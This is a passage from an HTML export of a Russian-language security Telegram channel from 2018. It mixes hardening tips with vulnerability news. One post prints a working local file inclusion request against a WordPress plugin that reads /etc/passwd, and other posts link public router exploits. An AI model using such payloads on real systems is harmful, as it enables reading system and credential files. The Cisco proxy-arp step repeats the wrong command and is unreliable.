href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1428">https://bugs.chromium.org/p/project-zero/issues/detail?id=1428</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-113">

      <div class="body details">
28 February 2018
      </div>

     </div>

     <div class="message default clearfix" id="message128">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="28.02.2018 11:54:09">
11:54
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Linux&quot;)">#Linux</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Как то я писала, почему в Linux/Unix не стоит удалять пользователей и группы. Если вы это когда-нибудь делали, у вас могли остаться файлы, которые &quot;никому не принадлежат&quot;. При создании нового пользователя/группы они могут внезапно оказаться владельцами этих файлов.<br><br>Проверить, есть ли такие файлы:<br><br><code>df --local -P | awk &apos;{if (NR!=1) print $6}&apos; | xargs -I &quot;{}&quot; find &quot;{}&quot; -xdev -nouser -ls 2&gt;/dev/null</code><br><code>df --local -P | awk &apos;{if (NR!=1) print $6}&apos; | xargs -I &quot;{}&quot; find &quot;{}&quot; -xdev -nogroup -ls 2&gt;/dev/null</code><br><br>Если что-то нашлось - можно удалить или назначить владельца, по ситуации.<br><br>И раз уж мы занялись беглой проверкой прав на файлы, посмотрим еще общедоступные для записи файлы:<br><br><code>find -xdev -type f -perm -0002 2&gt;/dev/null</code><br><br>Местами такие права могут быть необходимы, но в общем случае это нездоровая ситуация.<br><br>А общедоступным директориям, если таковые имеются, нужен стики бит, чтобы кто попало не мог удалять чужие файлы:<br><br><code>df --local -P | awk {&apos;if (NR!=1) print $6&apos;} | xargs -I &apos;{}&apos; find &apos;{}&apos; -xdev -type d -perm -0002 2&gt;/dev/null | xargs chmod a+t</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-114">

      <div class="body details">
1 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message129">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="01.03.2018 07:53:33">
07:53
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>А если у вас роутер Asus, то надо бы озаботиться версией его прошивки. Ибо вот эксплойт для AsusWRT <a href="https://packetstormsecurity.com/files/146560/AsusWRT-LAN-Unauthenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/146560/AsusWRT-LAN-Unauthenticated-Remote-Code-Execution.html</a> и предназначен он для метасплойта.<br><br>Используются две уязвимости CVE-2018-5999 и CVE-2018-6000. Проблема актуальна до версии 3.0.0.4.384.10007 AsusWRT. Эксплойт позволяет получить доступ с правами суперпользователя, ну а что ж еще?
       </div>

      </div>

     </div>

     <div class="message service" id="message-115">

      <div class="body details">
2 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message130">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="02.03.2018 08:02:18">
08:02
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Частенько бывает необходимо узнать, какие ресурсы с какими общаются в сети и по каким протоколам, или проверить, что трафик к внешним сетям отсутствует. В этом может неплохо подсобить NetFlow, который считает сетевую статистику.<br><br>Для сбора данных есть, например, такие тулзы:<br><a href="https://www.manageengine.com/products/netflow/download-free.html">https://www.manageengine.com/products/netflow/download-free.html</a> (полнофункциональная триалка на 30 дней)<br><a href="https://www.paessler.com/download/prtg-download">https://www.paessler.com/download/prtg-download</a> (полнофункциональная триалка на 30 дней)<br><a href="https://www.ntop.org/products/netflow/nprobe/">https://www.ntop.org/products/netflow/nprobe/</a> (свободная, но требует компиляции, установшик предоставляет урезанные функции)<br><br>Пример конфигурации NetFlow на Cisco Catalyst:<br><br><code>flow record NetFlow-collect</code><br><code>match ipv4 source address</code>                         <br><code>match ipv4 destination address</code><br><code>match ipv4 protocol</code><br><code>match transport source-port</code><br><code>match transport destination-port</code><br><code>match ipv4 tos</code><br><code>match interface input</code><br><code>collect interface output</code><br><code>collect counter bytes long</code><br><code>collect counter packets long</code><br><br><code>flow exporter NetFlow-Exporter</code><br><code>destination 10.10.10.10</code><br><code>source GigabitEthernet1/0/1</code>   //исходящий интерфейс для данных NetFlow<br><code>transport udp 2055</code>   // порт, на котором слушает сборщик, зависит от используемой тулзы<br><br><code>flow monitor NetFlow-Monitor</code><br><code>record NetFlow-collect</code><br><code>exporter NetFlow-Exporter</code><br><code>cache timeout active 60</code><br><code>cache timeout inactive 15</code><br><br>Базовая настройка закончена, теперь можно включать анализ трафика на любых интерфейсах легким движением руки:<br><br><code>(config-if)# ip flow monitor NetFlow-to-Orion input</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-116">

      <div class="body details">
5 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message131">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.03.2018 10:56:43">
10:56
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Тулза <strong>windows-exploit-suggester</strong> помогает найти эксплойты, актуальные для исследуемой системы Windows. Тулза на питоне, но на проверяемой системе его устанавливать не обязательно, достаточно собрать с нее systeminfo в текстовый файлик и передать тулзе на любой машине.<br><br>Скачать можно на <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py">https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py</a><br><br>Требует установки модуля xlrd:<br><br><code>pip install xlrd --upgrade</code><br><br>Перед запуском обновить базу уязвимостей (подтягивает с сайта Microsoft):<br><br><code>windows-exploit-suggester.py --update</code><br><br><strong>Запускаем анализ:</strong><br><br><code>windows-exploit-suggester.py --database &lt;имя_файла_базы_уязвимостей&gt;.xlsx --systeminfo systeminfo.txt</code><br><br>Тулза сама определит версию Windows, просерчит установленные KBшки и выведет перечень эксплойтов для неустраненных уязвимостей. С опцией —audit выведет все незакрытые уязвимости, даже те, для которых нет эксплойтов. А опция <code>--hotfixes</code> сгенерит список нехватающих патчей.<br><br>Надо иметь в виду, что тулза не знает об установленных компонентах и выводит незакрытые уязвимости для всех возможных компонентов, даже которых нет.<br><br><strong>Ну а теперь пара ложек дегтя:</strong><br><br>1. База уязвимостей подтягивается с URL <a href="http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx">http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx</a> и содержит уязвимости с MS08-068 по MS17-023, только.<br><br>2. Перечень эксплойтов вшит в тулзу и, соответственно, не особо то обновляется. На данный момент самый свежий сплойт для MS16-135.
       </div>

      </div>

     </div>

     <div class="message service" id="message-117">

      <div class="body details">
6 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message132">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="06.03.2018 10:53:24">
10:53
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Иногда ведь может понадобиться поснифать трафик прям на циске? Ну точно может. Это не проблема.<br><br>Надо задать буфер для сохранения:<br><br><code>cisco# monitor capture buffer MYBUFFER</code><br><br>И там всякие размеры, круговую перезапись, предварительную очистку, экспорт на внешний сервис, ацл можно задать. Смотрите по ?.<br><br>Далее создаем точку захвата трафика и связываем с буфером:<br><br><code>cisco# monitor capture point ip cef POINT1 g1/0 both</code><br><code>cisco# monitor capture point associate POINT1 MYBUFFER</code><br><br>Запускаем запись:<br><br><code>cisco# monitor capture point start POINT1</code> (остановить можно так же, с помощью stop)<br><br>На Cisco IOS-XE все немного иначе:<br><br><code>cisco# monitor capture MYCAP interface GigabitEthernet1/0/1 both</code><br><code>cisco# monitor capture MYCAP match any</code><br><code>cisco# monitor capture MYCAP file location flash:mycap.pcap buffer-size 10</code><br><code>cisco# monitor capture MYCAP start</code><br><br>Также есть всякие дополнительные настроечки для количества пакетов, размера буфера, количества записываемых байт, аксес-листов для ограничения записываемого трафика.<br><br>Посмотреть статус:<br><br><code>show monitor capture MYCAP</code><br><br>Посмотреть содержание:<br><br><code>show monitor capture file flash:mycap.pcap</code><br><code>show monitor capture file flash:mycap.pcap detailed</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-118">

      <div class="body details">
7 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message133">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="07.03.2018 11:59:08">
11:59
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;web&quot;)">#web</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Sonarwhal - сканер мисконфигов веб-сайтов от команды разработчиков Microsoft Edge. Код открыт, распространяется бесплатно, в общем лицензия Apache 2.0.<br><br>Проверяются мисконфиги на тему рабоспособности, эффективности и безопасности. Безопасность включает проверку разрешенных заголовков, валидности сертификатов, наличия уязвимых js библиотек, параметров cookie, наличия HSTS, конфигурации content type и еще некоторых.<br><br>Попробовать сканер можно совершенно элементарно, бесплатно и полнофункционально на <a href="https://sonarwhal.com/scanner/">https://sonarwhal.com/scanner/</a>.<br><br>А если понравится, то можно и себе установить. Работает на Node.js и может потребовать установки Chrome или Edge при соответствующих настройках, иначе использует jsdom (как и онлайн-версия).<br><br>Установка и использование очень просты:<br><br><code>npm install -g --engine-strict sonarwhal</code><br><code>sonarwhal --init</code><br><code>sonarwhal https://example.com</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-119">

      <div class="body details">
12 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message134">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="12.03.2018 11:25:27">
11:25
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br>В анализаторе логов веб-сайтов WebLog Expert, а точнее в его веб-интерфейсе, выявлены уязвимости, под которые доступны эксплойты: обход аутентификации <a href="https://packetstormsecurity.com/files/146697/WebLog-Expert-Web-Server-Enterprise-9.4-Weak-Permissions.html">https://packetstormsecurity.com/files/146697/WebLog-Expert-Web-Server-Enterprise-9.4-Weak-Permissions.html</a> и отказ в обслуживании <a href="https://packetstormsecurity.com/files/146698/WebLog-Expert-Web-Server-Enterprise-9.4-Denial-Of-Service.html">https://packetstormsecurity.com/files/146698/WebLog-Expert-Web-Server-Enterprise-9.4-Denial-Of-Service.html</a>. Дыры присутствуют в версии 9.4 софта, которая и есть на данный момент последняя доступная.<br><br>Любопытно, что в данном случае уязвимости стали рекламой. WebLog Expert - софт для анализа посещаемости, путей, рефереров, поисковых запросов и прочей информации о посетителях (впрочем, никакой активной слежки за ними), а также строит всякие графики и диаграммы по собранным данным.<br><br>Учитывая назначение софта, уязвимости некритичны, так как доступ к его веб-интерфейсу в общем случае достаточен локальный по <a href="127.0.0.1">127.0.0.1</a>, да и вообще веб-интерфейс в данной софтине не ключевая функция. Так что несмотря на отсутствие патча, владельцы могут просто закрыть к нему сетевой доступ.
       </div>

      </div>

     </div>

     <div class="message service" id="message-120">

      <div class="body details">
13 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message135">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="13.03.2018 11:01:11">
11:01
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Windows&quot;)">#Windows</a> <a href="" onclick="return ShowHashtag(&quot;tools&quot;)">#tools</a><br><br>Бывает иногда навязчивое желание проверить систему на хорошо спрятанные вредоносы. RootkitRevealer от великого Руссиновича работает только для XP и Server 2003, так что... впрочем есть много других, современных, вот, например, Malwarebytes Anti Rootkit (<a href="https://ru.malwarebytes.com/antirootkit/">https://ru.malwarebytes.com/antirootkit/</a>). Почему Malwarebytes? Да знакомый вирусный аналитик их рекомендовал.<br><br>Да, у них есть и обычный антивирь, зачем же отдельный антируткит? А это чтобы можно было его быстро модифицировать с учетом последней инфы о руткитах, не влияя на остальную часть софта. Впрочем в Malwarebytes Anti Malware тоже есть функция поиска руткитов, только она по умолчанию выключена и ее надо включить в настройках.<br><br>Проверяет MBAR драйвера, сектора дисков и систему, что позволяет среди прочего выявлять руткиты вне файловых систем. Сам ничего не удаляет, но может, а еще прилагается тулза для устранения внесенных вредоносом изменений.<br><br>Да-да, конечно полноценная криминалистическая экспертиза это одно, а автоматическая тулза - другое, но в большинстве случаев первое неуместно, а второе - лучшее из существующего.
       </div>

      </div>

     </div>

     <div class="message service" id="message-121">

      <div class="body details">
14 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message136">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.03.2018 10:59:32">
10:59
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;AMD&quot;)">#AMD</a> <a href="" onclick="return ShowHashtag(&quot;vulns&quot;)">#vulns</a><br><br>Израильская компания CTS-Labs взялась исследовать последние массовые поделки AMD EPYC и Ryzen и нашла в них 13 уязвимостей. Ресечеры не стали ждать апдейтов, а сразу анонсировали уязвимости, что впрочем и понятно - исправления займут у AMD с полгода, а некоторые баги вообще не могут быть устранены.<br><br>Что в итоге:<br><br>- Уязвимости позволяют внедрить вредоносный код в Secure Processor (элемент EPYC и Ryzen) в процессе работы<br><br>- Уязвимости позволяют обойти защиту Credential Guard и стырить учетные данные, охраняемые ей<br><br>- В Ryzen встроен бэкдор<br><br>- Решение безопасности для облачных провайдеров Secure Encrypted Virtualization можно обойти через уязвимости в EPYC Secure Processor<br><br>Почитать подробности: <a href="https://3dnews.ru/966903">https://3dnews.ru/966903</a><br>Вайтпейпер от ресечеров: <a href="https://safefirmware.com/amdflaws_whitepaper.pdf">https://safefirmware.com/amdflaws_whitepaper.pdf</a><br>Технические детали в целях безопасности ресечерами не раскрываются =)
       </div>

      </div>

     </div>

     <div class="message service" id="message-122">

      <div class="body details">
15 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message137">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.03.2018 11:07:21">
11:07
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Редко найдешь сетевика, который обновляет свои железки сразу по выходу обновлений (ну или через 30 дней, что разумнее). А большинство и новые уязвимости не отслеживает. Ну а если эксплойты публичные появились - вот тут уже надо обновиться или переконфигуриться.<br><br>Широкой публике представлены два эксплойта (RCE) для роутеторов MicroTik <a href="https://packetstormsecurity.com/files/146745/MikroTik-RouterOS-Chimay-Red-Stack-Clash-Remote-Code-Execution.html">https://packetstormsecurity.com/files/146745/MikroTik-RouterOS-Chimay-Red-Stack-Clash-Remote-Code-Execution.html</a>, <a href="https://packetstormsecurity.com/files/146744/MikroTik-RouterOS-Chimay-Red-Stack-Clash-Remote-Code-Execution.html">https://packetstormsecurity.com/files/146744/MikroTik-RouterOS-Chimay-Red-Stack-Clash-Remote-Code-Execution.html</a>.<br><br>Уязвимы версии RouterOS до 6.38.4 включительно, апдейты давно доступны. Уязвимости находятся в веб-сервере и эксплуатируются через веб-интерфейс, поэтому при паническом нежелании обновляться можно рассмотреть строгое ограничение доступа к веб-интерфейсу или его отключение.
       </div>

      </div>

     </div>

     <div class="message service" id="message-123">

      <div class="body details">
16 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message138">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.03.2018 11:42:38">
11:42
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a><br><br>немного о нюансах работы DHCP<br><br>тачка: &quot;чуваки, есть DHCP?&quot;<br>DHCP: &quot;ага&quot;<br>&quot;дай адрес&quot;<br>&quot;держи&quot;<br>тачка: &quot;чуваки, это чей адрес?&quot;<br>с галерки: &quot;мой!&quot;<br>тачка: &quot;что ты мне выдал, скотина?! забери обратно!&quot;<br><br>* * *<br><br>тачка: &quot;черт! адрес занят!... есть DHCP?&quot;<br>DHCP: &quot;нуу, я&quot;<br>&quot;дай адрес&quot;<br>DHCP: &quot;чуваки, кто занял адрес?&quot;<br>&quot;кто занял адрес?&quot;<br>&quot;кто занял адрес?&quot;<br>....<br>(тишина)<br>DHCP тачке: &quot;да держи, норм адрес&quot;<br>тачка: &quot;!!!!&quot;<br><br>* * *<br><br>...: &quot;псс, тачка, лови адрес&quot;<br><br><br>ну а че, пятница же))
       </div>

      </div>

     </div>

     <div class="message service" id="message-124">

      <div class="body details">
19 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message139">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.03.2018 12:10:12">
12:10
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;DNS&quot;)">#DNS</a> <a href="" onclick="return ShowHashtag(&quot;tools&quot;)">#tools</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Забавный сервис по анализу DNS <a href="https://dnsspy.io/scan">https://dnsspy.io/scan</a>. Бесплатный. Красиво выводит результаты, дает рекомендации и даже геймофикация немного добавлена.<br><br>Оценивает доступность, скорость работы, резервирование и безопасность. Под безопасностью подразумеваются DNSSEC и возможная компрометация провайдера. Зато отдельно есть сводка по публично доступным адресам в домене, можно посмотреть, нет ли там чего, о чем вы предпочли бы не распространяться.<br><br>А что действительно стоит проверить на ваших днс-серверах, так это возможность публичного трансфера зоны:<br><br><code>dig @&lt;NS address&gt; example.com axfr</code><br><br>Удивительно, но даже крупные провайдеры порой его не ограничивают. Так что в случае чего можно ткнуть провайдера в проблему или подкрутить настройки на собственных серверах, в зависимости от используемой схемы.
       </div>

      </div>

     </div>

     <div class="message service" id="message-125">

      <div class="body details">
20 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message140">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="20.03.2018 12:06:48">
12:06
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;wordpress&quot;)">#wordpress</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br>В плагине WordPress Site Editor наблюдается уязвимость локального включения файлов. Эксплуатируется примерно так:<br><br><code>http://&lt;host&gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</code><br><br>А вот уязвимый код:<br><br><code>if( isset( $_REQUEST[&apos;ajax_path&apos;] ) &amp;&amp; is_file( $_REQUEST[&apos;ajax_path&apos;] ) &amp;&amp; file_exists( $_REQUEST[&apos;ajax_path&apos;] ) ){</code><br><code>    require_once $_REQUEST[&apos;ajax_path&apos;];</code><br><code>}</code><br><br>Это в <a href="https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5">https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5</a><br><br>Уязвимость в версии 1.1.1, но исправлять ее, похоже, никто не собирается.
       </div>

      </div>

     </div>

     <div class="message default clearfix" id="message141">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="20.03.2018 15:09:50">
15:09
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;офтоп&quot;)">#офтоп</a><br><br>От телеграма опять требуют ключи под угрозой блокировки:<br><a href="https://tproger.ru/news/telegram-15-days-left/">https://tproger.ru/news/telegram-15-days-left/</a><br><br>Если что - мы готовы переезжать:<br><a href="https://vk.com/informhardening">https://vk.com/informhardening</a><br><a href="https://www.facebook.com/groups/2001513396767302">https://www.facebook.com/groups/2001513396767302</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-126">

      <div class="body details">
21 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message142">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="21.03.2018 12:05:55">
12:05
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Циски не поставляются с безопасными настройками по умолчанию. Хуже того, настройки интерфейсов тоже требуют вмешательства. Хорошо хоть можно один раз настроить и забыть.<br><br>У приличных по безопасности компаний есть готовый шаблон, который они штампуют на всех свежих устройствах/интерфейсах (держа в уме маловероятные, но все же возможные исключения). Что же там входит насчет интерфейсов третьего уровня?<br><br>Защищаемся от подделки маршрутов с помощью ICMP-редиректов:<br><br><code>(config-if)# no ip redirects</code><br><br>Отключаем proxy-arp, чтобы не расширять канальные сегменты (есть нюансы, мы о них уже писали раньше):<br><br><code>(config-if)# no ip redirects</code><br><br>а можно глобально отключить:<br><br><code>(config)# ip arp proxy disable</code><br><br>Защищаемся от флуда/доса в сети:<br><br><code>(config-if)# no ip directed-broadcast</code><br><br>И, в зависимости от уровня жесткости, можно отключить ICMP-unreachables и ответы о маске сети:<br><br><code>(config-if)# no ip unreachables</code><br><code>(config-if)# no ip mask-reply</code><br><br>А еще есть функция uRPF для защиты от подделки IP-адресов, но о ней будет отдельная история.
       </div>

      </div>

     </div>

     <div class="message service" id="message-127">

      <div class="body details">
22 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message143">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.03.2018 11:58:42">
11:58
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;tools&quot;)">#tools</a><br><br>Попалась как-то ссылка на &quot;детектор арп-спуфинга&quot; <a href="https://github.com/rnehra01/arp-validator">https://github.com/rnehra01/arp-validator</a> и я такая: &quot;Ух ты!&quot;. Дошли руки посмотреть, и что же там на самом деле:<br><br>1. Проверка осуществляется путем отправки TCP SYN на заявленный в арп-пакете IP с использованием заявленного в арп-пакете MAC. Типа, если ответ будет (RST или ACK), то хост честный. А вот все стандартные тулзы для арп-спуфинга такой пакет перешлют оригинальному хосту, а потом перешлют полученный ответ. А нестандартные могут и сами ответить. Так что этот метод в принципе НЕ РАБОТАЕТ.<br><br>2. Если на проверяемом хосте включен фаервол, то он будет считаться нечестным, бугага =)<br><br>3. Надо устанавливать Node.js и еще кучу всего.<br><br>В общем, удивительно, как можно собрать столько недостатков в одной тулзе.
       </div>

      </div>

     </div>

     <div class="message service" id="message-128">

      <div class="body details">
23 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message144">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="23.03.2018 11:22:53">
11:22
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Windows&quot;)">#Windows</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Эксплойтов для винды подвалило...Патчи для уязвимостей, впрочем, выпущены и доступны.<br><br>CVE-2018-0877 - Повышение привилегий - Windows 10, Windows Server 2016, Windows 1709 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1452">https://bugs.chromium.org/p/project-zero/issues/detail?id=1452</a><br><br>CVE-2018-0880 - Повышение привилегий - Windows 10, Windows Server 2016, Windows 1709 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1492">https://bugs.chromium.org/p/project-zero/issues/detail?id=1492</a><br><br>CVE-2018-0882 - Повышение привилегий - Windows 10, Windows Server 2016 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1494">https://bugs.chromium.org/p/project-zero/issues/detail?id=1494</a><br><br>CVE-2018-0894 - Раскрытие памяти (кучи) - х64 версии от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1458">https://bugs.chromium.org/p/project-zero/issues/detail?id=1458</a><br><br>CVE-2018-0895 - Раскрытие памяти (стека) - х64 версии от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1462">https://bugs.chromium.org/p/project-zero/issues/detail?id=1462</a><br><br>CVE-2018-0897 - Раскрытие памяти (стека) - х64 версии от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1472">https://bugs.chromium.org/p/project-zero/issues/detail?id=1472</a><br><br>CVE-2018-0901 - Раскрытие памяти (стека) - х64 версии от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1484">https://bugs.chromium.org/p/project-zero/issues/detail?id=1484</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-129">

      <div class="body details">
26 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message145">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="26.03.2018 09:03:55">
09:03
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
